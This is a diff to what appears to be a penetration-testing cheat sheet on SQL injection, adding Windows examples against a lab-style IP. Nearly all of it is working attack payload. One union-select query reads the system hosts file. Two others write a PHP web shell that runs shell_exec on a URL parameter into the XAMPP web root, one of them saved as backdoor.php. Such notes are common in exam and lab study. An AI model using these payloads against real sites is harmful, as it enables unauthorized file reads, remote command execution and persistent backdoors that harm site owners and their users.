@@ -362,6 +362,15 @@ https://sushant747.gitbooks.io/total-oscp-guide/sql-injections.html
      ?id=1 union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6,7,8,9 into OUTFILE 'c:/xampp/htdocs/cmd.php'
 	
 	
+Example SQLi on Windows:
+#testing
+
+    http://10.10.10.10/debug.php?id=1 union all select 1, 2, load_file('C:/Windows/System32/drivers/etc/hosts')
+
+#exploitation
+
+    http://10.10.10.10/debug.php?id=1 union all select 1, 2, "<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE 'c:/xampp/htdocs/backdoor.php'
+
 	
 # Resources  
 
